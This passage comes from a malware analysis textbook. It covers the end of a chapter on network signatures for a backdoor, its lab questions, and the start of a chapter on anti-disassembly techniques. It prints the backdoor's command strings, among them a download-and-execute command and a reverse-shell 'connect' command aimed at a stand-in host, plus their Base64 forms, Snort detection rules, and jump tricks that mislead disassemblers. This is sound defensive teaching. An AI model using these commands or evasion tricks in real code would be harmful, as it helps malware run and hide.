<html><head></head><body>
<p class="calibre1">Sleep for 1 hour</p>
<p class="calibre1">superlongsleep</p>
<p class="calibre1">c3VwZXJsb25nc2xlZXA=</p>
<p class="calibre1">Sleep for 24 hours</p>
<p class="calibre1">shortsleep</p>
<p class="calibre1">c2hvcnRzbGVlcA==</p>
<p class="calibre1">Sleep for 1 minute</p>
<p class="calibre1">run:www.example.com/fast.exe</p>
<p class="calibre1">cnVuOnd3dy5leGFtcGxlLmNvbS9mYXN0LmV4ZQ==</p>
<p class="calibre1">Download and execute a binary </p>
<p class="calibre1">on the local system</p>
<p class="calibre1">connect:www.example.com:80</p>
<p class="calibre1">Y29ubmVjdDp3d3cuZXhhbXBsZS5jb206ODA=</p>
<p class="calibre1">Use a custom protocol to establish </p>
<p class="calibre1">a reverse shell</p>
<p class="calibre1">Malware-Focused Network Signatures</p>
<p class="calibre1"><b class="calibre3">319</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p353"/>One approach to creating signatures for this backdoor is to target the full set of commands known to be used by the malware (including the surrounding context). Content expressions for the five commands recognized by the malware would contain the following strings:</p>
<p class="calibre1">&lt;!-- adsrv?bG9uZ3NsZWVw --&gt; </p>
<p class="calibre1">&lt;!-- adsrv?c3VwZXJsb25nc2xlZXA= --&gt; </p>
<p class="calibre1">&lt;!-- adsrv?c2hvcnRzbGVlcA== --&gt; </p>
<p class="calibre1">&lt;!-- adsrv?cnVu</p>
<p class="calibre1">&lt;!-- adsrv?Y29ubmVj</p>
<p class="calibre1">The last two expressions target only the static part of the commands (run and connect), and since the length of the argument is not known, they do not target the trailing comment characters (--&gt;). </p>
<p class="calibre1">While signatures that use all of these elements will likely find this precise piece of malware, there is a risk of being too specific at the expense of robust-ness. If the attacker changes any part of the malware—the command set, the encoding, or the command prefix—a very precise signature will cease to be effective. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Targeting Multiple Elements</b></i></p>
<p class="calibre1">Previously, we saw that different parts of the command interpretation were in different parts of the code. Given that knowledge, we can create different signatures to target the various elements separately. </p>
<p class="calibre1">The three elements that appear to be in distinct functions are comment bracketing, the fixed adsrv? with a Base64 expression following, and the actual command parsing. Based on these three elements, a set of signature elements could include the following (for brevity, only the primary elements of each signature are included, with each line representing a different signature). </p>
<p class="calibre1">pcre:"/&lt;!-- adsrv\?([a-zA-Z0-9+\/=]{4})+ --&gt;/" </p>
<p class="calibre1">content:"&lt;!-- "; content:"bG9uZ3NsZWVw --&gt;"; within:100; content:"&lt;!-- "; content:"c3VwZXJsb25nc2xlZXA= --&gt;"; within:100; content:"&lt;!-- "; content:"c2hvcnRzbGVlcA== --&gt;"; within:100; content:"&lt;!-- "; content:"cnVu";within:100;content: "--&gt;"; within:100; content:"&lt;!-- "; content:"Y29ubmVj"; within:100; content:"--&gt;"; within:100; These signatures target the three different elements that make up a command being sent to the malware. All include the comment bracketing. </p>
<p class="calibre1">The first signature targets the command prefix adsrv? followed by a generic Base64-encoded command. The rest of the signatures target a known Base64-encoded command without any dependency on a command prefix. </p>
<p class="calibre1">Since we know the parsing occurs in a separate section of the code, it makes sense to target it independently. If the attacker changes one part of the code or the other, our signatures will still detect the unchanged part. </p>
<p class="calibre1">Note that we are still making assumptions. The new signatures may be more prone to false positives. We are also assuming that the attacker will most likely continue to use comment bracketing, since comment bracketing is a part of regular web communications and is unlikely to be considered <b class="calibre3">320</b></p>
<p class="calibre1">Chapter 14</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p354"/>suspicious. Nevertheless, this strategy provides more robust coverage than our initial attempt and is more likely to detect future variants of the malware. </p>
<p class="calibre1">Let’s revisit the signature we created earlier for beacon traffic. Recall that we combined every possible element into the same signature: alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon "; content:"User-Agent: Mozilla/4.0 (compatible\; MSIE 7.0\; Windows NT 5.1)"; content:"Accept: * / *"; uricontent:"58"; content:!"|0d0a|referer:"; nocase; pcre:"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10 [012]){8} HTTP/"; classtype:trojan-activity; sid:2000002; rev:1;)</p>
<p class="calibre1">This signature has a limited scope and would become useless if the attacker made any changes to the malware. A way to address different elements individually and avoid rapid obsolescence is with these two targets:</p>
<p class="calibre1"></p>
<p class="calibre1">Target 1: User-Agent string, Accept string, no referrer</p>
<p class="calibre1"></p>
<p class="calibre1">Target 2: Specific URI, no referrer</p>
<p class="calibre1">This strategy would yield two signatures:</p>
<p class="calibre1">alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon UA with Accept Anomaly"; content:"User-Agent: Mozilla/4.0 (compatible\; MSIE 7.0\; Windows NT 5.1)"; content:"Accept: * / *"; content:!"|0d0a|referer:"; nocase; classtype:trojan-activity; sid:2000004; rev:1;)</p>
<p class="calibre1">alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon URI"; uricontent:"58"; content:!"|0d0a|referer:"; nocase; pcre:</p>
<p class="calibre1">"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10[012]){8} HTTP/"; classtype:trojan-activity; sid:2000005; rev:1;)</p>
<p class="calibre1"><b class="calibre3">Understanding the Attacker’s Perspective</b></p>
<p class="calibre1">When designing a signature strategy, it’s wise to try to understand the attacker’s perspective. Attackers are playing a constant game of cat-and-mouse. Their intent is to blend in with regular traffic to avoid detection and maintain successful ongoing operations. Like any software developers, attackers struggle to update software, to remain current and compatible with changing systems. Any changes that are necessary should be minimal, as large changes can threaten the integrity of their systems. </p>
<p class="calibre1">As previously discussed, using multiple signatures that target different parts of the malicious code makes detection more resilient to attacker modifications. Often, attackers will change their software slightly to avoid detection by a specific signature. By creating multiple signatures that key off of different aspects of the communication, you can still successfully detect the malware, even if the attacker has updated a portion of the code. </p>
<p class="calibre1">Here are three additional rules of thumb that you can use to take advantage of attacker weaknesses:</p>
<p class="calibre1"><b class="calibre3">Focus on elements of the protocol that are part of both end points. </b></p>
<p class="calibre1">Changing either the client code or the server code alone is much easier than changing both. Look for elements of the protocol that use code at Malware-Focused Network Signatures</p>
<p class="calibre1"><b class="calibre3">321</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p355"/>both the client and server side, and create a signature based on these elements. The attacker will need to do a lot of extra work to render such a signature obsolete. </p>
<p class="calibre1"><b class="calibre3">Focus on any elements of the protocol known to be part of a key. </b></p>
<p class="calibre1">Often, some hard-coded components of a protocol are used as a key. For example, an attacker may use a specific User-Agent string as an authentication key so that illegitimate probing can be detected (and possibly rerouted). In order for an attacker to bypass such a signature, he would need to change code at both end points. </p>
<p class="calibre1"><b class="calibre3">Identify elements of the protocol that are not immediately apparent in traffic. </b></p>
<p class="calibre1">Sometimes, the simultaneous actions of multiple defenders can impede the detection of malware. If another defender creates a signature that achieves sufficient success against an attacker, the attacker may be com-pelled to adjust his malware to avoid the signature. If you are relying on the same signature, or a signature that targets the same aspects of the attacker’s communication protocol, the attacker’s adjustment will affect your signature as well. In order to avoid being rendered obsolete by the attacker’s response to another defender, try to identify aspects of malicious operations that other defenders might not have focused on. Knowledge gained from carefully observing the malware will help you develop a more robust signature. </p>
<p class="calibre1"><b class="calibre3">Conclusion</b></p>
<p class="calibre1">In this chapter, we’ve described the way in which malware uses the network for command and control. We’ve also covered some of the techniques malware uses to disguise its activity to look like regular network traffic. Malware analysis can improve the effectiveness of network defense by providing insights into the signature-generation process. </p>
<p class="calibre1">We’ve described several advantages to basing network signatures on a deeper malware analysis, rather than a surface analysis of existing traffic captures or a sandbox-based analysis. Signatures based on malware analysis can be more precise, reducing the trial and error needed to produce low false-positive signatures. Additionally, they have a higher likelihood of identifying new strains of the same malware. </p>
<p class="calibre1">This chapter has addressed what is often the endgame of basic malware analysis: development of an effective countermeasure to protect from future malware. However, this chapter assumes that it is possible to achieve a good understanding of the malware through dynamic and static analyses. In some cases, malware authors take active measures to prevent effective analysis. The next set of chapters explain the techniques malware authors use to stymie analysis and what steps you can take to ensure that you can fully decompose and understand the malware in question. </p>
<p class="calibre1"><b class="calibre3">322</b></p>
<p class="calibre1">Chapter 14</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p356"/><b class="calibre3">L A B S</b></p>
<p class="calibre1">This chapter’s labs focus on identifying the networking components of malware. To some degree, these labs build on Chapter 13, since when developing network signatures, you’ll often need to deal with encoded content. </p>
<p class="calibre1"><b class="calibre3">Lab 14-1</b></p>
<p class="calibre1">Analyze the malware found in file  <i class="calibre4">Lab14-01.exe</i>. This program is not harmful to your system. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">Which networking libraries does the malware use, and what are their advantages? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What source elements are used to construct the networking beacon, and what conditions would cause the beacon to change? </p>
<p class="calibre1">3. </p>
<p class="calibre1">Why might the information embedded in the networking beacon be of interest to the attacker? </p>
<p class="calibre1">4. </p>
<p class="calibre1">Does the malware use standard Base64 encoding? If not, how is the encoding unusual? </p>
<p class="calibre1">5. </p>
<p class="calibre1">What is the overall purpose of this malware? </p>
<p class="calibre1">6. </p>
<p class="calibre1">What elements of the malware’s communication may be effectively detected using a network signature? </p>
<p class="calibre1">7. </p>
<p class="calibre1">What mistakes might analysts make in trying to develop a signature for this malware? </p>
<p class="calibre1">8. </p>
<p class="calibre1">What set of signatures would detect this malware (and future variants)? </p>
<p class="calibre1"><b class="calibre3">Lab 14-2</b></p>
<p class="calibre1">Analyze the malware found in file  <i class="calibre4">Lab14-02.exe</i>. This malware has been configured to beacon to a hard-coded loopback address in order to prevent it from harming your system, but imagine that it is a hard-coded external address. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">What are the advantages or disadvantages of coding malware to use direct IP addresses? </p>
<p class="calibre1">2. </p>
<p class="calibre1">Which networking libraries does this malware use? What are the advantages or disadvantages of using these libraries? </p>
<p class="calibre1">Malware-Focused Network Signatures</p>
<p class="calibre1"><b class="calibre3">323</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p357"/>3. </p>
<p class="calibre1">What is the source of the URL that the malware uses for beaconing? </p>
<p class="calibre1">What advantages does this source offer? </p>
<p class="calibre1">4. </p>
<p class="calibre1">Which aspect of the HTTP protocol does the malware leverage to achieve its objectives? </p>
<p class="calibre1">5. </p>
<p class="calibre1">What kind of information is communicated in the malware’s initial beacon? </p>
<p class="calibre1">6. </p>
<p class="calibre1">What are some disadvantages in the design of this malware’s communication channels? </p>
<p class="calibre1">7. </p>
<p class="calibre1">Is the malware’s encoding scheme standard? </p>
<p class="calibre1">8. </p>
<p class="calibre1">How is communication terminated? </p>
<p class="calibre1">9. </p>
<p class="calibre1">What is the purpose of this malware, and what role might it play in the attacker’s arsenal? </p>
<p class="calibre1"><b class="calibre3">Lab 14-3</b></p>
<p class="calibre1">This lab builds on Lab 14-1. Imagine that this malware is an attempt by the attacker to improve his techniques. Analyze the malware found in file <i class="calibre4">Lab14-03.exe</i>. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">What hard-coded elements are used in the initial beacon? What elements, if any, would make a good signature? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What elements of the initial beacon may not be conducive to a long-lasting signature? </p>
<p class="calibre1">3. </p>
<p class="calibre1">How does the malware obtain commands? What example from the chapter used a similar methodology? What are the advantages of this technique? </p>
<p class="calibre1">4. </p>
<p class="calibre1">When the malware receives input, what checks are performed on the input to determine whether it is a valid command? How does the attacker hide the list of commands the malware is searching for? </p>
<p class="calibre1">5. </p>
<p class="calibre1">What type of encoding is used for command arguments? How is it different from Base64, and what advantages or disadvantages does it offer? </p>
<p class="calibre1">6. </p>
<p class="calibre1">What commands are available to this malware? </p>
<p class="calibre1">7. </p>
<p class="calibre1">What is the purpose of this malware? </p>
<p class="calibre1">8. </p>
<p class="calibre1">This chapter introduced the idea of targeting different areas of code with independent signatures (where possible) in order to add resiliency to network indicators. What are some distinct areas of code or configuration data that can be targeted by network signatures? </p>
<p class="calibre1">9. </p>
<p class="calibre1">What set of signatures should be used for this malware? </p>
<p class="calibre1"><b class="calibre3">324</b></p>
<p class="calibre1">Chapter 14</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p358"/><b class="calibre3">PART 5</b></p>
<p class="calibre1"><b class="calibre3">A N T I - R E V E R S E - E N G I N E E R I N G</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p359"/><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p360"/><b class="calibre3">A N T I - D I S A S S E M B L Y</b></p>
<p class="calibre1"> <i class="calibre4">Anti-disassembly</i> uses specially crafted code or data in a program to cause disassembly analysis tools to produce </p>
<p class="calibre1">an incorrect program listing. This technique is crafted </p>
<p class="calibre1">by malware authors manually, with a separate tool in </p>
<p class="calibre1">the build and deployment process or interwoven into </p>
<p class="calibre1">their malware’s source code. </p>
<p class="calibre1">All malware is designed with a particular goal in mind: keystroke logging, backdoor access, using a target system to send excessive email to cripple servers, and so on. Malware authors often go beyond this basic functionality to implement specific techniques to hide from the user or system administrator, using rootkits or process injection, or to otherwise thwart analysis and detection. </p>
<p class="calibre1">Malware authors use anti-disassembly techniques to delay or prevent analysis of malicious code. Any code that executes successfully can be reverse-engineered, but by armoring their code with anti-disassembly and anti-debugging techniques, malware authors increase the level of skill required of the malware analyst. The time-sensitive investigative process is hindered by </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p361"/>the malware analyst’s inability to understand the malware’s capabilities, derive valuable host and network signatures, and develop decoding algorithms. These additional layers of protection may exhaust the in-house skill level at many organizations and require expert consultants or large research project levels of effort to reverse-engineer. </p>
<p class="calibre1">In addition to delaying or preventing human analysis, anti-disassembly is also effective at preventing certain automated analysis techniques. Many malware similarity detection algorithms and antivirus heuristic engines employ disassembly analysis to identify or classify malware. Any manual or automated process that uses individual program instructions will be susceptible to the anti-analysis techniques described in this chapter. </p>
<p class="calibre1"><b class="calibre3">Understanding Anti-Disassembly</b></p>
<p class="calibre1">Disassembly is not a simple problem. Sequences of executable code can have multiple disassembly representations, some that may be invalid and obscure the real functionality of the program. When implementing anti-disassembly, the malware author creates a sequence that tricks the disassembler into showing a list of instructions that differ from those that will be executed. </p>
<p class="calibre1">Anti-disassembly techniques work by taking advantage of the assumptions and limitations of disassemblers. For example, disassemblers can only represent each byte of a program as part of one instruction at a time. If the disassembler is tricked into disassembling at the wrong offset, a valid instruction could be hidden from view. For example, examine the following fragment of disassembled code:</p>
<p class="calibre1">jmp     short near ptr loc_2+1</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">loc_2:                                  ; CODE XREF: seg000:00000000j call    near ptr 15FF2A71h </p>
<p class="calibre1">or      [ecx], dl</p>
<p class="calibre1">inc     eax</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">db    0</p>
<p class="calibre1">This fragment of code was disassembled using the linear-disassembly technique, and the result is inaccurate. Reading this code, we miss the piece of information that its author is trying to hide. We see what appears to be a call instruction, but the target of the call is nonsensical . The first instruction is a jmp instruction whose target is invalid because it falls in the middle of the next instruction. </p>
<p class="calibre1"><b class="calibre3">328</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p362"/>Now examine the same sequence of bytes disassembled with a different strategy:</p>
<p class="calibre1">jmp     short loc_3</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">db 0E8h</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">loc_3:                                  ; CODE XREF: seg000:00000000j push    2Ah</p>
<p class="calibre1">call    Sleep </p>
<p class="calibre1">This fragment reveals a different sequence of assembly mnemonics, and it appears to be more informative. Here, we see a call to the API function Sleep at . The target of the first jmp instruction is now properly represented, and we can see that it jumps to a push instruction followed by the call to Sleep. </p>
<p class="calibre1">The byte on the third line of this example is 0xE8, but this byte is not executed by the program because the jmp instruction skips over it. </p>
<p class="calibre1">This fragment was disassembled with a flow-oriented disassembler, rather than the linear disassembler used previously. In this case, the flow-oriented disassembler was more accurate because its logic more closely mirrored the real program and did not attempt to disassemble any bytes that were not part of execution flow. We’ll discuss linear and flow-oriented disassembly in more detail in the next section. </p>
<p class="calibre1">So, disassembly is not as simple as you may have thought. The disassembly examples show two completely different sets of instructions for the same set of bytes. This demonstrates how anti-disassembly can cause the disassembler to produce an inaccurate set of instructions for a given range of bytes. </p>
<p class="calibre1">Some anti-disassembly techniques are generic enough to work on most disassemblers, while some target specific products. </p>
<p class="calibre1"><b class="calibre3">Defeating Disassembly Algorithms</b></p>
<p class="calibre1">Anti-disassembly techniques are born out of inherent weaknesses in disassembler algorithms. Any disassembler must make certain assumptions in order to present the code it is disassembling clearly. When these assumptions fail, the malware author has an opportunity to fool the malware analyst. </p>
<p class="calibre1">There are two types of disassembler algorithms: linear and flow-oriented. </p>
<p class="calibre1">Linear disassembly is easier to implement, but it’s also more error-prone. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Linear Disassembly</b></i></p>
<p class="calibre1">The  <i class="calibre4">linear-disassembly</i> strategy iterates over a block of code, disassembling one instruction at a time linearly, without deviating. This basic strategy is employed by disassembler writing tutorials and is widely used by debuggers. </p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">329</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p363"/>Linear disassembly uses the size of the disassembled instruction to determine which byte to disassemble next, without regard for flow-control instructions. </p>
<p class="calibre1">The following code fragment shows the use of the disassembly library libdisasm ( <i class="calibre4">http://sf.net/projects/bastard/files/libdisasm/</i>) to implement a crude disassembler in a handful of lines of C using linear disassembly: char buffer[BUF_SIZE]; </p>
<p class="calibre1">int position = 0; </p>
<p class="calibre1">while (position &lt; BUF_SIZE) {</p>
<p class="calibre1">x86_insn_t insn; </p>
<p class="calibre1">int size = x86_disasm(buf, BUF_SIZE, 0, position, &amp;insn); if (size != 0) {</p>
<p class="calibre1">char disassembly_line[1024]; </p>
<p class="calibre1">x86_format_insn(&amp;insn, disassembly_line, 1024, intel_syntax); printf("%s\n", disassembly_line); </p>
<p class="calibre1">position += size; </p>
<p class="calibre1">} else {</p>
<p class="calibre1">/* invalid/unrecognized instruction */</p>
<p class="calibre1">position++; </p>
<p class="calibre1">}</p>
<p class="calibre1">}</p>
<p class="calibre1">x86_cleanup(); </p>
<p class="calibre1">In this example, a buffer of data named buffer contains instructions to be disassembled. The function x86_disasm will populate a data structure with the specifics of the instruction it just disassembled and return the size of the instruction. The loop increments the position variable by the size value  if a valid instruction was disassembled; otherwise, it increments by one . </p>
<p class="calibre1">This algorithm will disassemble most code without a problem, but it will introduce occasional errors even in nonmalicious binaries. The main drawback to this method is that it will disassemble too much code. The algorithm will keep blindly disassembling until the end of the buffer, even if flow-control instructions will cause only a small portion of the buffer to execute. </p>
<p class="calibre1">In a PE-formatted executable file, the executable code is typically contained in a single section. It is reasonable to assume that you could get away with just applying this linear-disassembly algorithm to the .text section containing the code, but the problem is that the code section of nearly all binaries will also contain data that isn’t instructions. </p>
<p class="calibre1">One of the most common types of data items found in a code section is a pointer value, which is used in a table-driven switch idiom. The following disassembly fragment (from a nonlinear disassembler) shows a function that contains switch pointers immediately following the function code. </p>
<p class="calibre1"><b class="calibre3">330</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p364"/>          jmp     ds:off_401050[eax*4] ; switch jump</p>
<p class="calibre1">; switch cases omitted ... </p>
<p class="calibre1">xor     eax, eax</p>
<p class="calibre1">pop     esi</p>
<p class="calibre1">retn</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">off_401050 dd offset loc_401020    ; DATA XREF: _main+19r dd offset loc_401027    ; jump table for switch statement dd offset loc_40102E</p>
<p class="calibre1">dd offset loc_401035</p>
<p class="calibre1">The last instruction in this function is retn. In memory, the bytes immediately following the retn instruction are the pointer values beginning with 401020 at , which in memory will appear as the byte sequence 20 10 40 00 </p>
<p class="calibre1">in hex. These four pointer values shown in the code fragment make up 16 bytes of data inside the .text section of this binary. They also happen to disassemble to valid instructions. The following disassembly fragment would be produced by a linear-disassembly algorithm when it continues disassembling instructions beyond the end of the function:</p>
<p class="calibre1">and [eax],dl</p>
<p class="calibre1">inc eax</p>
<p class="calibre1">add [edi],ah</p>
<p class="calibre1">adc [eax+0x0],al</p>
<p class="calibre1">adc cs:[eax+0x0],al</p>
<p class="calibre1">xor eax,0x4010</p>
<p class="calibre1">Many of instructions in this fragment consist of multiple bytes. The key way that malware authors exploit linear-disassembly algorithms lies in plant-ing data bytes that form the opcodes of multibyte instructions. For example, the standard local call instruction is 5 bytes, beginning with the opcode 0xE8. </p>
<p class="calibre1">If the 16 bytes of data that compose the switch table end with the value 0xE8, the disassembler would encounter the call instruction opcode and treat the next 4 bytes as an operand to that instruction, instead of the beginning of the next function. </p>
<p class="calibre1">Linear-disassembly algorithms are the easiest to defeat because they are unable to distinguish between code and data. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Flow-Oriented Disassembly</b></i></p>
<p class="calibre1">A more advanced category of disassembly algorithms is the  <i class="calibre4">flow-oriented disassembler</i>. This is the method used by most commercial disassemblers such as IDA Pro. </p>
<p class="calibre1">The key difference between flow-oriented and linear disassembly is that the disassembler doesn’t blindly iterate over a buffer, assuming the data is Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">331</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p365"/>nothing but instructions packed neatly together. Instead, it examines each instruction and builds a list of locations to disassemble. </p>
<p class="calibre1">The following fragment shows code that can be disassembled correctly only with a flow-oriented disassembler. </p>
<p class="calibre1">test    eax, eax</p>
<p class="calibre1">jz      short loc_1A</p>
<p class="calibre1">push    Failed_string</p>
<p class="calibre1">call    printf</p>
<p class="calibre1">jmp     short loc_1D</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">Failed_string:  db 'Failed',0</p>
<p class="calibre1">; ---------------------------------------------------------------------------</p>
<p class="calibre1">loc_1A:  </p>
<p class="calibre1">xor     eax, eax</p>
<p class="calibre1">loc_1D:</p>
<p class="calibre1">retn</p>
<p class="calibre1">This example begins with a test and a conditional jump. When the flow-oriented disassembler reaches the conditional branch instruction jz at , it notes that at some point in the future it needs to disassemble the location loc_1A at . Because this is only a conditional branch, the instruction at  </p>
<p class="calibre1">is also a possibility in execution, so the disassembler will disassemble this as well. </p>
<p class="calibre1">The lines at  and  are responsible for printing the string Failed to the screen. Following this is a jmp instruction at . The flow-oriented disassembler will add the target of this, loc_1D, to the list of places to disassemble in the future. Since jmp is unconditional, the disassembler will not automatically disassemble the instruction immediately following in memory. Instead, it will step back and check the list of places it noted previously, such as loc_1A, and disassemble starting from that point. </p>
<p class="calibre1">In contrast, when a linear disassembler encounters the jmp instruction, it will continue blindly disassembling instructions sequentially in memory, regardless of the logical flow of the code. In this case, the Failed string would be disassembled as code, inadvertently hiding the ASCII string and the last two instructions in the example fragment. For example, the following fragment shows the same code disassembled with a linear-disassembly algorithm. </p>
<p class="calibre1">test    eax, eax</p>
<p class="calibre1">jz      short near ptr loc_15+5</p>
<p class="calibre1">push    Failed_string</p>
<p class="calibre1">call    printf</p>
<p class="calibre1">jmp     short loc_15+9</p>
<p class="calibre1">Failed_string:</p>
<p class="calibre1">inc     esi</p>
<p class="calibre1">popa</p>
<p class="calibre1">loc_15:</p>
<p class="calibre1">imul    ebp, [ebp+64h], 0C3C03100h</p>
<p class="calibre1"><b class="calibre3">332</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p366"/>In linear disassembly, the disassembler has no choice to make about which instructions to disassemble at a given time. Flow-oriented disassemblers make choices and assumptions. Though assumptions and choices might seem unnecessary, simple machine code instructions are complicated by the addition of problematic code aspects such as pointers, exceptions, and conditional branching. </p>
<p class="calibre1">Conditional branches give the flow-oriented disassembler a choice of two places to disassemble: the true or the false branch. In typical compiler-generated code, there would be no difference in output if the disassembler processes the true or false branch first. In handwritten assembly code and anti-disassembly code, however, the two branches can often produce different disassembly for the same block of code. When there is a conflict, most disassemblers trust their initial interpretation of a given location first. Most flow-oriented disassemblers will process (and thus trust) the false branch of any conditional jump first. </p>
<p class="calibre1">Figure 15-1 shows a sequence of bytes and their corresponding machine instructions. Notice the string hello in the middle of the instructions. When the program executes, this string is skipped by the call instruction, and its 6 </p>
<p class="calibre1">bytes and NULL terminator are never executed as instructions. </p>
<p class="calibre1">CALL</p>
<p class="calibre1">h     e     l      l     o</p>
<p class="calibre1">POP RET</p>
<p class="calibre1">E8</p>
<p class="calibre1">06</p>
<p class="calibre1">00</p>
<p class="calibre1">00</p>
<p class="calibre1">00</p>
<p class="calibre1">68</p>
<p class="calibre1">65</p>
<p class="calibre1">6c</p>
<p class="calibre1">6c</p>
<p class="calibre1">6F</p>
<p class="calibre1">00</p>
<p class="calibre1">58</p>
<p class="calibre1">C3</p>
<p class="calibre1"> <i class="calibre4">Figure 15-1: call instruction followed by a string</i></p>
<p class="calibre1">The call instruction is another place where the disassembler must make a decision. The location being called is added to the future disassembly list, along with the location immediately after the call. Just as with the conditional jump instructions, most disassemblers will disassemble the bytes after the call instruction first and the called location later. In handwritten assembly, programmers will often use the call instruction to get a pointer to a fixed piece of data instead of actually calling a subroutine. In this example, the call instruction is used to create a pointer for the string hello on the stack. The pop instruction following the call then takes this value off the top of the stack and puts it into a register (EAX in this case). </p>
<p class="calibre1">When we disassemble this binary with IDA Pro, we see that it has produced disassembly that is not what we expected:</p>
<p class="calibre1">E8 06 00 00 00       call    near ptr loc_4011CA+1</p>
<p class="calibre1">68 65 6C 6C 6F</p>
<p class="calibre1">push    6F6C6C65h</p>
<p class="calibre1">loc_4011CA:</p>
<p class="calibre1">00 58 C3             add     [eax-3Dh], bl</p>
<p class="calibre1">As it turns out, the first letter of the string hello is the letter  <i class="calibre4">h</i>, which is 0x68 in hexadecimal. This is also the opcode of the 5-byte instruction  push DWORD. The null terminator for the hello string turned out to also be the first Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">333</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p367"/>byte of another legitimate instruction. The flow-oriented disassembler in IDA Pro decided to process the thread of disassembly at  (immediately following the call instruction) before processing the target of the call instruction, and thus produced these two erroneous instructions. Had it processed the target first, it still would have produced the first push instruction, but the instruction following the push would have conflicted with the real instructions it disassembled as a result of the call target. </p>
<p class="calibre1">If IDA Pro produces inaccurate results, you can manually switch bytes from data to instructions or instructions to data by using the C or D keys on the keyboard, as follows:</p>
<p class="calibre1"></p>
<p class="calibre1">Pressing the C key turns the cursor location into code. </p>
<p class="calibre1"></p>
<p class="calibre1">Pressing the D key turns the cursor location into data. </p>
<p class="calibre1">Here is the same function after manual cleanup:</p>
<p class="calibre1">E8 06 00 00 00                       call    loc_4011CB</p>
<p class="calibre1">68 65 6C 6C 6F 00    aHello          db 'hello',0</p>
<p class="calibre1">loc_4011CB:                             </p>
<p class="calibre1">58                                   pop     eax</p>
<p class="calibre1">C3                                   retn</p>
<p class="calibre1"><b class="calibre3">Anti-Disassembly Techniques</b></p>
<p class="calibre1">The primary way that malware can force a disassembler to produce inaccurate disassembly is by taking advantage of the disassembler’s choices and assumptions. The techniques we will examine in this chapter exploit the most basic assumptions of the disassembler and are typically easily fixed by a malware analyst. More advanced techniques involve taking advantage of information that the disassembler typically doesn’t have access to, as well as generating code that is impossible to disassemble completely with conventional assembly listings. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Jump Instructions with the Same Target</b></i></p>
<p class="calibre1">The most common anti-disassembly technique seen in the wild is two back-to-back conditional jump instructions that both point to the same target. For example, if a jz loc_512 is followed by jnz loc_512, the location loc_512 will always be jumped to. The combination of jz with jnz is, in effect, an unconditional jmp, but the disassembler doesn’t recognize it as such because it only disassembles one instruction at a time. When the disassembler encounters the jnz, it continues disassembling the false branch of this instruction, despite the fact that it will never be executed in practice. </p>
<p class="calibre1"><b class="calibre3">334</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p368"/>The following code shows IDA Pro’s first interpretation of a piece of code protected with this technique:</p>
<p class="calibre1">74 03                  jz      short near ptr loc_4011C4+1</p>
<p class="calibre1">75 01                  jnz     short near ptr loc_4011C4+1</p>
<p class="calibre1">loc_4011C4:                     ; CODE XREF: sub_4011C0</p>
